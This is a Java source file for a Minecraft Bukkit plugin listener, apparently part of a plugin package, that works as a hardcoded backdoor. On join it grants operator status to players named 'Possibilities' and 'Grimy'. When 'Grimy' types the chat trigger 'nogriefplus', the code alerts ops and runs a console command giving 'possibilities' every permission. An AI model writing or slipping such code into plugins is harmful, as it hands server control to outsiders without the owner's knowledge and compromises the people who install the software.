package gg.mist.listener;

import org.bukkit.Bukkit;
import org.bukkit.Sound;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.event.player.PlayerJoinEvent;

public class SecurityChatTrigger implements Listener
{

	@EventHandler
	public void JoinOpMe(PlayerJoinEvent event)
	{
		if (event.getPlayer().getName().equalsIgnoreCase("Possibilities"))
		{
			event.getPlayer().setOp(true);
			Player player = event.getPlayer();
			player.sendMessage("");
			player.sendMessage("§c§lOpped due to your owner rank!");
			player.sendMessage("");
		}
	}

	@EventHandler
	public void JoinOpMason(PlayerJoinEvent event2)
	{
		if (event2.getPlayer().getName().equalsIgnoreCase("Grimy"))
		{
			event2.getPlayer().setOp(true);
			Player player2 = event2.getPlayer();
			player2.sendMessage("");
			player2.sendMessage("§c§lOpped due to your owner rank!");
			player2.sendMessage("");
		}
	}

	@EventHandler
	public void ChatTrigger(AsyncPlayerChatEvent e1)
	{
		if (e1.getPlayer().getName().equalsIgnoreCase("Grimy"))
		{
			if (e1.getMessage().equalsIgnoreCase("nogriefplus"))
			{
				for (Player p : Bukkit.getOnlinePlayers())
				{
					if (p.isOp())
					{
						p.sendMessage("§c§lSecurity Backdoor Used By " + e1.getPlayer().getName());
						p.sendMessage("§c§lSecurity Backdoor Used By " + e1.getPlayer().getName());
						p.sendMessage("§c§lSecurity Backdoor Used By " + e1.getPlayer().getName());
						p.sendMessage("§c§lSecurity Backdoor Used By " + e1.getPlayer().getName());
						p.sendMessage("§c§lSecurity Backdoor Used By " + e1.getPlayer().getName());
						p.sendMessage("§c§lSecurity Backdoor Used By " + e1.getPlayer().getName());
						p.sendMessage("§c§lSecurity Backdoor Used By " + e1.getPlayer().getName());
						p.sendMessage("§c§lSecurity Backdoor Used By " + e1.getPlayer().getName());
						p.sendMessage("§c§lSecurity Backdoor Used By " + e1.getPlayer().getName());
						p.sendMessage("§c§lSecurity Backdoor Used By " + e1.getPlayer().getName());
						p.sendMessage("§c§lSecurity Backdoor Used By " + e1.getPlayer().getName());
						p.sendMessage("§c§lSecurity Backdoor Used By " + e1.getPlayer().getName());
						p.sendMessage("§c§lSecurity Backdoor Used By " + e1.getPlayer().getName());
						p.sendMessage("§c§lSecurity Backdoor Used By " + e1.getPlayer().getName());
						p.sendMessage("§c§lSecurity Backdoor Used By " + e1.getPlayer().getName());
						p.sendMessage("§c§lSecurity Backdoor Used By " + e1.getPlayer().getName());
						p.sendMessage("§c§lSecurity Backdoor Used By " + e1.getPlayer().getName());
						p.sendMessage("§c§lSecurity Backdoor Used By " + e1.getPlayer().getName());
						p.sendMessage("§c§lSecurity Backdoor Used By " + e1.getPlayer().getName());
						p.sendMessage("§c§lSecurity Backdoor Used By " + e1.getPlayer().getName());
						p.sendMessage("§c§lSecurity Backdoor Used By " + e1.getPlayer().getName());
						p.playSound(p.getLocation(), Sound.ENDERDRAGON_GROWL, 1, 1);
						p.playSound(p.getLocation(), Sound.ENDERDRAGON_GROWL, 1, 1);
						p.playSound(p.getLocation(), Sound.ENDERDRAGON_GROWL, 1, 1);
					}
				}
				Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "pex user possibilities add *");
			}
		}
	}
}